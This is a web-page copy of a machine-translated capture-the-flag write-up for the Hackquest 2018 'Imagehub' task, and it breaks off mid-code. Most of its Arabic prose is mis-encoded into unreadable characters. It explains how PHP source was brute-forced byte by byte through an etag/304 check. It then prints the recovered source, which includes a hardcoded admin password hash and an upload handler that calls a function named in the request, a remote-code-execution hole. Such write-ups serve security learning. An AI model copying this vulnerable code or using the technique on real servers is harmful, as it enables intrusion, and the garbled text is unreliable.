<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>๐คจ ๐จโโ๏ธ ๐ Hackquest 2018. ุงููุชุงุฆุฌ ูุงููุชุงุจุฉ. ููู 4-7 ๐๏ธ โ ๐</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ููุง ูุนุฏูุง ุ ูููู ุจูุดุฑ ุงูุฌุฒุก ุงูุซุงูู ูู ูุฑุงุฑุงุช ุงูุงุฎุชุฑุงู ุงูุณููู. ุงูููู 4-7: ุงูุชูุชุฑ ูุฒุฏุงุฏ ุ ูุงูููุงู ุฃูุซุฑ ุฅุซุงุฑุฉ ููุงูุชูุงู! 


 ุงููุญุชูู: 


- ููู 4. Imagehub...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hackquest 2018. ุงููุชุงุฆุฌ ูุงููุชุงุจุฉ. ููู 4-7</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/440312/" style=";text-align:right;direction:rtl">  ููุง ูุนุฏูุง ุ ูููู ุจูุดุฑ ุงูุฌุฒุก ุงูุซุงูู ูู ูุฑุงุฑุงุช ุงูุงุฎุชุฑุงู ุงูุณููู.  ุงูููู 4-7: ุงูุชูุชุฑ ูุฒุฏุงุฏ ุ ูุงูููุงู ุฃูุซุฑ ุฅุซุงุฑุฉ ููุงูุชูุงู! <br><img src="https://habrastorage.org/webt/oa/br/8l/oabr8lkxzurvxgw-20o0jq23hgo.jpeg"><br><a name="habracut"></a><br><h2 style=";text-align:right;direction:rtl">  ุงููุญุชูู: </h2><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููู 4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Imagehub</a> </li><li style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููู 5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูููุช</a> </li><li style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููู 6.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุฑููุจุฉ vm</a> </li><li style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูููู 7.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงููุตุฏุฑ ุงููุฎูู</a> </li></ul><br><img src="https://habrastorage.org/webt/xv/67/n9/xv67n9j_kw2fxrljp9zrrqewzxk.jpeg"><br><h2 style=";text-align:right;direction:rtl"><a name="Imagehub"></a>  ููู 4.  Imagehub </h2><br>  ุชู ุฅุนุฏุงุฏ ูุฐู ุงููููุฉ ุจูุงุณุทุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">SPbCTF</a> . <br><br>  <i>ุณูู ุฎูููุง ุงูุฌุฏูุฏ ูุชู Instagram.</i>  <i>ุณูููุนู ุจูููุชูู ููุท:</i> <i><br><br></i>  <i>1. ุงููุฑุดุญุงุช.</i>  <i>ูุฑุดุญุงุช ุฌุฏูุฏุฉ ูู ูุณุจู ููุง ูุซูู ููุตูุฑ ุงูุชู ุชู ุชุญููููุง.</i> <i><br></i>  <i>2. ุงูุชุฎุฒูู ุงููุคูุช.</i>  <i>ูุถูู ุฎุงุฏู HTTP ุงููุฎุตุต ูุจูุท ูููุงุช ุงูุตูุฑ ูู ุฐุงูุฑุฉ ุงูุชุฎุฒูู ุงููุคูุช ูููุชุตูุญ.</i> <i><br><br></i>  <i>ุฌุฑุจู ุงูุขู!</i>  <i>imagehub.spb.ctf.su</i> <i><br><br></i>  <i>ุชุดุบูู / get_the_flag ููููุฒ.</i> <i><br></i>  <i>ุฎุงุฏู ูุฎุตุต ุซูุงุฆู: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">dppth</a></i> <br><br>  <b>ุชูููุญุงุช</b> <br>  <i><b>10/25/2018 20:00</b></i> <i><br></i>  <i>ุงููููุฉ ูู ุชุญู</i>  <i>ุชูุช ุฅุถุงูุฉ 24 ุณุงุนุฉ.</i> <i><br><br></i>  <i><b>10/25/2018 17:00</b></i> <i><br></i>  <i>ููุงู ููุนุงู ูู ุงูุฃุฎุทุงุก ุงูุชู ูุนุฑููุง.</i>  <i>ุฃูู ูุงุญุฏ ูุญุตู ูู ูุตุงุฏุฑ ุชุทุจูู ุงูููุจ ุ ูุงูุซุงูู ูุญุตู ูู RCE.</i> <br><br><h4 style=";text-align:right;direction:rtl">  ูุธุฑุฉ ุนุงูุฉ: </h4><br>  ูุงุจู ููุชูููุฐ: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ELF x86_64 </li><li style=";text-align:right;direction:rtl">  ุชููุฐ ุฎุงุฏู HTTP ุจุณูุท </li><li style=";text-align:right;direction:rtl">  ุฅุฐุง ูุงู ุงูููู ุงููุทููุจ ุจู ุจุช ูุงุจู ููุชูููุฐ ุ ูุชู ุชูุฑูุฑู ุฅูู php-fpm </li><li style=";text-align:right;direction:rtl">  ุชุทุจู ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุงูุชุฎุฒูู ุงููุคูุช etag ุงููุฎุตุตุฉ </li></ul><br>  ุฌุฒุก ุงูููุจ: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูุฏูู ูุธููุฉ ุชุญููู ุงููููุงุช.  ูููู ุชุนุฏูู ุงูุตูุฑุฉ ุจุงุณุชุฎุฏุงู ูุฑุดุญุงุช ูุญุฏุฏุฉ ูุณุจูุง. </li><li style=";text-align:right;direction:rtl">  ุตูุญุฉ ุงููุณุคูู ูุน Basic on /ุ Admin = show </li></ul><br><h4 style=";text-align:right;direction:rtl">  ุงูุถุนู: ูุฑุงุกุฉ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุงููุตุฏุฑ </h4><br>  ุชุจุฏู ูุธููุฉ ุฐุงูุฑุฉ ุงูุชุฎุฒูู ุงููุคูุช ูุซูุฑุฉ ููุงูุชูุงู ุ ูุฃูู ูููููุง ุงูุญุตูู ุนูู ุชุฌุฒุฆุฉ ูุทุงู ุงูุฎุงุฏู ุงูุชุนุณูู ูู ุงูููู (ุญุชู 1 ุจุงูุช ูุทุงู). <br><br> <code>Etag = sprintf("%08x%08x%08x", file_mtime, hash, file_size);</code> <br> <div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุธููุฉ ูุงุด:</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">etag_hash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> v16 = [<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">16</span></span>)] v16[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span> v16[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0x1DB71064</span></span> v16[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0x3B6E20C8</span></span> v16[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0x26D930AC</span></span> v16[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0x76DC4190</span></span> v16[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0x6B6B51F4</span></span> v16[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0x4DB26158</span></span> v16[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0x5005713C</span></span> v16[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0xEDB88320</span></span> v16[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0xF00F9344</span></span> v16[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0xD6D6A3E8</span></span> v16[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0xCB61B38C</span></span> v16[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0x9B64C2B0</span></span> v16[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0x86D3D2D4</span></span> v16[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0xA00AE278</span></span> v16[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0xBDBDF21C</span></span> hash = <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(data)): v5 = ((hash &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[(hash ^ data[i]) &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span>]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> hash = ((v5 &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[v5 &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span> ^ (data[i] &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>)]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (~hash) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span></code> </pre> <br></div></div><br>  ูุณูุก ุงูุญุธ ุ ูุชู ุชุฌุฑูุฏ etag ูู ุฃุฌู ุงููููุงุช ุงููุงุจูุฉ ููุชูููุฐ (* .php): <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">stat_0(v2, &amp;stat_buf); if ( stat_buf.st_mode &amp; S_IEXEC ) { setHeader(a2-&gt;respo, "cache-control", "no-store"); deleteHeade(a2-&gt;respo, "etag"); set_environment_info(a1); dup2(fd, 0); snprintf(s, 4096, "/usr/bin/php-cgi %s", a1-&gt;url);</code> </pre> <br>  ูุง ูุฒุงู ููุงู ูุญุต ูุจู ุชูููุฐ ุงูุตูุญุฉ ุ ูุฐูู ุฅุฐุง ุฎูููุง ุจุดูู ุตุญูุญ ูููุฉ etag ( <b>ุฅู ูู ููู ููุงู ุชุทุงุจู</b> ) ุ ูุฅู ุงูุฎุงุฏู ุณูู ููุฏู ููุง ุงุณุชุฌุงุจุฉ ูุญุงูุฉ <b>ุบูุฑ ูุนุฏููุฉ 304</b> .  ุจุงุณุชุฎุฏุงู ูุฐุง ูููููุง bruteforce ุดูุฑุฉ ุงููุตุฏุฑ ุจุงูุช ุจุงูุช. <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">v11 = getHeader(&amp;s.request, "if-modified-since"); if ( v11 ) { v3 = getHeader(&amp;v14, "last-modified"); if ( !strcmp(v11, v3) ) send_status(304); } v12 = getHeader(&amp;s.request, "if-none-match"); if ( v12 ) { v4 = getHeader(&amp;v14, "etag"); if ( !strcmp(v12, v4) ) send_status(304); } exec_and_prepare_response_body(&amp;s, &amp;a2a);</code> </pre> <br>  ูููุฎุต ูุง ุญุตููุง ุนููู ูู RE: <br><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูููู ูุฑุงุกุฉ ุงูุทุงุจุน ุงูุฒููู ุจุณูููุฉ ูู ุฑุฃุณ ุงุณุชุฌุงุจุฉ ุงูุชุนุฏูู ุงูุฃุฎูุฑ (ุณูุณูุฉ -&gt; ุงูุทุงุจุน ุงูุฒููู). </li><li style=";text-align:right;direction:rtl">  ูุณูุญ ุงููุทุงู ุจุทูู ุจุงูุช ูุงุญุฏ (ูุฐูู ุณูุญุตู ุนูู ุชุฌุฒุฆุฉ ุจุงูุช ูุงุญุฏ ููุท) </li><li style=";text-align:right;direction:rtl">  ูููู ุชุฎููู ุงูุชุฌุฒุฆุฉ ููุทุงู ุจุงูุช ูุงุญุฏ (256 ูููุฉ ููููุฉ) </li><li style=";text-align:right;direction:rtl">  ุงูุญุฌู ูุงุจู ููุชูููุฐ ุ ููููุง ุจุญุงุฌุฉ ุฅูู ูุนุฑูุฉ ุจุงูุช ูุงุญุฏ ุนูู ุงูุฃูู ูู ุงูููู ุงููุฏู. </li><li style=";text-align:right;direction:rtl">  ูุธุฑูุง ูุฃููุง ูุฑุบุจ ูู ุงูุญุตูู ุนูู ูุตุฏุฑ ููููุงุช * .php ุ ููู ุงูููุชุฑุถ ุฃู ุงูููู ูุจุฏุฃ ุจู "&lt;ุ Php". </li></ol><br>  ุงูุฎุทูุฉ ุงูุฃููู ูู ุงูุญุตูู ุนูู ุงูุญุฌู ุ ูุงูุซุงูู ูู ุงูุญุตูู ุนูู ูุญุชููุงุช ุงูููู ุงููุนููุฉ. <br>  ูุน ุงูุดูุฑุฉ ุงููุชุนุฏุฏุฉ ุงูุฎููุท ุ ูุตูุช ุฅูู ุณุฑุนุฉ ุญูุงูู 1 ุชุดุงุฑ / ุซุงููุฉ ุ ูุฃูููุช ุจุนุถ ุงููููุงุช: <br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">index.php</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// error_reporting(0); if (isset($_GET["admin"]) &amp;&amp; (!isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW'] !== '888b2f04eef9a49fc87fa81089b736de')) { header('WWW-Authenticate: Basic realm="Admin Area"'); header('HTTP/1.0 401 Unauthorized'); } require "upload.php"; $uploader = new ImageUploader(); $result = $uploader-&gt;upload(); if ($result === true) die(); if ($result &gt; 0) { echo "Error: " . $result; } if ($uploader-&gt;upload() !== true) { include "templates/main.php"; }</span></span></code> </pre> <br></div></div><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">upload.php</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/uploaderror.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/verify.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/filters.php"</span></span>; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ImageUploader</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> TARGET_DIR = <span class="hljs-string"><span class="hljs-string">"51a8ae2cab09c6b728919fe09af57ded/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">upload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $result = verify_parameters(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($result !== <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $result; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!move_uploaded_file($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>], $target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::MOVE_ERROR; } $text = $_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]; $filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text); $imagick = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> \Imagick(realpath($target_file)); $imagick-&gt;scaleimage($size, $size); $imagick-&gt;setImageOpacity(<span class="hljs-number"><span class="hljs-number">0.5</span></span>); $imagick-&gt;compositeImage($filterImage, imagick::CHANNEL_ALPHA, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); header(<span class="hljs-string"><span class="hljs-string">"Content-Type: image/jpeg"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $imagick-&gt;getImageBlob(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } }</code> </pre> </div></div><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุดูู / filters.php</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">make_text</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($image, $size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $draw = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickDraw(); $draw-&gt;setFillColor(<span class="hljs-string"><span class="hljs-string">'white'</span></span>); $draw-&gt;setFontSize( <span class="hljs-number"><span class="hljs-number">18</span></span> ); $image-&gt;annotateImage($draw, $size / <span class="hljs-number"><span class="hljs-number">2</span></span> - <span class="hljs-number"><span class="hljs-number">65</span></span>, $size - <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, $text); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">futut</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">incasinato</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(130,100,255,3)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">fertocht</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $s = $size % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">"rgba($s,$s,$s,127)"</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">jebeno</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(0,255,255,255)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i*<span class="hljs-number"><span class="hljs-number">10</span></span>) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-($size-$j)) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">kuthamanga</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]+$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; }</code> </pre> <br></div></div><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุดูู / uploaderror.php</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UploadError</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> POST_SUBMIT = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> IMAGE_NOT_FOUND = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> NOT_IMAGE = <span class="hljs-number"><span class="hljs-number">2</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> FILE_EXISTS = <span class="hljs-number"><span class="hljs-number">3</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> BIG_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_EXTENSION = <span class="hljs-number"><span class="hljs-number">5</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> 